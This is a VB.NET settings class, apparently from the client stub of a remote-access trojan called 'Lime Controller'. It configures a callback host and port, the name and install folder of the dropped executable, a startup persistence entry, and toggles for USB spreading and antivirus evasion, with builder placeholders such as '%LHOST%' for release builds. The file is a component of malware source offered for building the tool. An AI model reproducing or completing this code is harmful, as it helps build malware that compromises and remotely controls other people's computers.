
Namespace Lime
    Public Class Settings

        'For testing use debug compiler

#If DEBUG Then
        Public Shared LHOST As String = "127.0.0.1"
        Public Shared LPORT As Integer = "1111"
        Public Shared SPL As String = "'L'"
        Public Shared LVER As String = "Stub 0.4"
        Public Shared LEXE As String = "Stub.exe"
        Public Shared STUPNAME As String = "Startupme"
        Public Shared NMT As Threading.Mutex = Nothing
        Public Shared MTX As String = "Lime_Controller_v0.4"
        Public Shared SPUSB As Boolean = False
        Public Shared ANTIV As Boolean = False
        Public Shared DRCHK As Boolean = False
        Public Shared DRPATH As String = "Lime"
        Public Shared DRFOLDER As String = "Lime2"
        Public Shared SPUSB_TEXT As String
        Public Shared NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
        Public Shared fullpath = Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE
#Else
        Public Shared LHOST As String = "%LHOST%"
        Public Shared LPORT As Integer = "%LPORT%"
        Public Shared SPL As String = "'L'"
        Public Shared LVER As String = "Stub 0.4"
        Public Shared LEXE As String = "%LEXE%"
        Public Shared STUPNAME As String = "%STNAME%"
        Public Shared NMT As Threading.Mutex = Nothing
        Public Shared MTX As String = "Lime_Controller_v0.4"
        Public Shared SPUSB As Boolean = "%SPUSB%"
        Public Shared ANTIV As Boolean = "%ANTIV%"
        Public Shared DRCHK As Boolean = "%DRCHK%"
        Public Shared DRPATH As String = "%DRPATH%"
        Public Shared DRFOLDER As String = "%DRFOLDER%"
        Public Shared SPUSB_TEXT As String
        Public Shared NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
        Public Shared fullpath = Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE
#End If

    End Class
End Namespace
